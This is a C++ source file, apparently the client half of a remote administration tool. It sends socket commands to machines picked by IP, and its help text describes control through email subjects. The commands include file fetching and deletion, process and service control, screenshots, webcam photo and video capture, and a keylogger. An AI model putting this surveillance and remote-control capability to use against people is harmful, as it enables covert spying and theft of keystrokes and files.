#include "client_cmd.h"


const std::string Command::directory = "temp\\";

bool Command::validateParameter() const{
    return true;
}

void Command::setCommandInfo(const std::string& ip, const std::string& command, const std::string& param){
    this->ip = ip;
    this->command = command;
    this->parameter = param;
}

bool Command::sendCommand(Client& client){
    SOCKET server_socket = client.getServerSocket(ip);
    std::string send_string = command + '-' + parameter;

    if (send(server_socket, send_string.c_str(), send_string.length(), 0) == SOCKET_ERROR){
        std::cerr << "Error: the server on the " << ip << " is no longer available" << std::endl;
        return 0;
    }
    
    std::cout << "command sent: " << send_string << std::endl; 
    
    return 1;
}  

std::string Command::getResponse(){
    std::string temp = response;
    response = "";
    return temp;
}

//*Shutdown Command
void ShutdownCommand::execute(Client& client){
    if (!sendCommand(client)){
        //* response
    }
    else{
        std::cout << "shutting down server from client..." << std::endl;
        response = client.receiveResponse(ip);
    }
    std::cout << response << std::endl;
}


void RestartCommand::execute(Client& client){
    if (!sendCommand(client)){
        //* response
    }
    else{
        std::cout << "restarting server..." << std::endl;
        response = client.receiveResponse(ip);
    }
    std::cout << response << std::endl;
}

bool RestartCommand::validateParameter() const {
    return true;
}

//*Get File Command
void GetFileCommand::execute(Client& client){
    if (!validateParameter()){
        std::cout << "Invalid parameter" << std::endl;
        //* response
        return;
    }
        
    if (!sendCommand(client)){
        //* response
    }
    else{
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
        
    std::cout << response << std::endl;
}

bool GetFileCommand::validateParameter() const {
    if (parameter.find("C:\\") == 0 && parameter.find('/') == std::string::npos)
        return true;
    return false;
}

//*Delete File Command
void DeleteFileCommand::execute(Client& client){
    if (!validateParameter()){
        std::cout << "Invalid parameter" << std::endl;
        //* response
        return;
    }
        
    if (!sendCommand(client)){
        //* response
    }
    else{
        response = client.receiveResponse(ip);
    }
        
    std::cout << response << std::endl;
}

bool DeleteFileCommand::validateParameter() const {
    if (parameter.find("C:\\") == 0 && parameter.find('/') == std::string::npos)
        return true;
    return false;
}

//* List File Command
void ListFileCommand::execute(Client& client){
    if (!validateParameter()){
        std::cout << "Invalid parameter" << std::endl;
        //* response
        return;
    }

    if (!sendCommand(client)){
        //*response
    }
    else{
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }

    std::cout << response << std::endl;
}

bool ListFileCommand::validateParameter() const {
    if (parameter.find("C:\\") == 0 && parameter.find('/') == std::string::npos)
        return true;
    return false;
}

void ListAppCommand::execute(Client& client){
    if (!sendCommand(client)){
        //* response
    }
    else{
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
    std::cout << response << std::endl;
}

bool ListAppCommand::validateParameter() const {
    return true;
}

void StartAppCommand::execute(Client& client){
    if (!validateParameter()){
        std::cout << "Invalid parameter" << std::endl;
        //* response
        return;
    }

    if (!sendCommand(client)){
        //*response
    }
    else{
        std::cout << "Starting application..." << std::endl;
        response = client.receiveResponse(ip);

    }

    std::cout << response << std::endl;
}

bool StartAppCommand::validateParameter() const {
    return true;
}

void StopAppCommand::execute(Client& client){
    if (!validateParameter()){
        std::cout << "Invalid parameter" << std::endl;
        //* response
        return;
    }
    
    if (!sendCommand(client)){
        //* response
    }
    else{
        std::cout << "Stopping applications..." << std::endl;
        response = client.receiveResponse(ip);

    }
    std::cout << response << std::endl;
}

bool StopAppCommand::validateParameter() const {
    return true;
}


void ScreenshotCommand::execute(Client& client){
    if (!validateParameter()){
        std::cout << "Invalid parameter" << std::endl;
        return;
    }

    if (!sendCommand(client)){
        //*response
    }

    else{
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
    std::cout << response << std::endl;
}

void GetIPsCommand::execute(Client& client){
    int status = SUCCESS;
    std::string message;
    message = "List of available IPs: \\n";

    for (auto ip : client.getIPList()) {
        message += ip + "\\n";
    }

    json j;
    j["status"] = status;
    j["message"] = message;
    j["file"] = "";

    response = j.dump();
}



void ListSerCommand::execute(Client& client) {
    if (!sendCommand(client)){
        //* response
    }
    else{
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

void TakePhotoCommand::execute(Client& client){
    if (!sendCommand(client)){
        //response when error

    }else{
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

void StartKeylogCommand::execute(Client& client) {
    if (!sendCommand(client)) {

    }
    else {
        response = client.receiveResponse(ip);
    }
}

void StopKeylogCommand::execute(Client& client) {
    if (!sendCommand(client)) {

    }
    else {
        if (client.receiveResponse(ip) == "RUNNING") {
            receiveFile(client, ip, directory);
        }
        response = client.receiveResponse(ip);
    }
}


void HelpCommand::execute(Client& client) {
    int status = SUCCESS;
    std::string help_text = R"(List of available commands:

1/ Help:
- Subject: help
- Return list of available commands

2/ Get IPs
- Subject: getips
- Return list of available computers and their IP andress

3/ Shutdown:
- Subject: shutdown
- Body: IP (line 1)

4/ Restart:
- Subject: restart
- Body: IP (line 1)

5/ Application:
a/ List Applications
- Subject: listapps
- Body: IP (line 1)
- Return list of applications in .txt

b/ Start Application:
- Subject: startapp
- Body: IP (line 1), Application name (line 2)

c/ Stop Application:
- Subject: stopapp
- Body: IP (line 1), Application's PID (line 2)

6/ Service:
a/ List Services
- Subject: listsers
- Body: IP (line 1)
- Return list of services in .txt

b/ Start Service:
- Subject: startser
- Body: IP (line 1), execution file/service name (line 2)

c/ Stop Service:
- Subject: stopser
- Body: IP (line 1), execution file/service name (line 2)

7/ File:
a/ List File
- Subject: listfiles
- Body: IP (line 1), directory path (line 2)
- Return list of files in .txt

b/ Get file
- Subject: getfile
- Body: IP (line 1), file path (line 2)
- Return file as attachment

c/ Delete File:
- Subject: delfile
- Body: IP (line 1), file path (line 2)

8/ Screenshot
- Subject: screenshot
- Body: IP (line 1)
- Return screenshot as attachment

9/ Webcam
a/ Take a photo
- Subject: takephoto
- Body: IP (line 1)
- Return photo as attachment

b/ Start recording video
- Subject: startrecord
- Body: IP (line 1)

c/ Stop recording video
- Subject: stoprecord
- Body: IP (line 1)
- Return video as attachment
- Require startrecord to be called before, maximum video length: 120 seconds

10/ Keylogger
a/ Start recording keystroke
- Subject: startkeylog
- Body: IP (line 1)

b/ Stop recording keystroke
- Subject: stopkeylog
- Body: IP (line 1)
- Return keystroke as attachment
- Require startkeylog to be called before, maximum time length: 300 seconds)";

    json j;
    j["status"] = status;
    j["message"] = help_text;
    j["file"] = "";
    response = j.dump();
}

void StartSerCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = 1;
        j["message"] = "Invalid parameter, please try again.";
        j["file"] = "";

        response = j.dump();
        return;
    }

    if (!sendCommand(client)){
        json j;
        j["status"] = 1;
        j["message"] = "An error occured while sending the command to server.";
        j["file"] = "";

        response = j.dump();
        return;
    }

    response = client.receiveResponse(ip);
}

void StopSerCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Invalid parameter, please try again.";
        j["file"] = "";

        response = j.dump();
        return;
    }

    if (!sendCommand(client)){
        json j;
        j["status"] = FAILURE;
        j["message"] = "An error occured while sending the command to server.";
        j["file"] = "";

        response = j.dump();
        return;
    }

    response = client.receiveResponse(ip);
}

bool StartSerCommand::validateParameter() const{
    return true;
}

bool StopSerCommand::validateParameter() const{
    return true;
}

void StartRecordCommand::execute(Client& client){
    if (!sendCommand(client)){
        json j;
        j["status"] = FAILURE;
        j["message"] = "An error occured while sending the command to server.";
        j["file"] = "";
        response = j.dump();
        return;
    }

    response = client.receiveResponse(ip);
    

}

void StopRecordCommand::execute(Client& client){
    if (!sendCommand(client)){
        json j;
        j["status"] = FAILURE;
        j["message"] = "An error occured while sending the command to server.";
        j["file"] = "";
        response = j.dump();
        return;
    }

    if (client.receiveResponse(ip) == "RUNNING"){
        receiveFile(client, ip, directory);
    }

    response = client.receiveResponse(ip);
}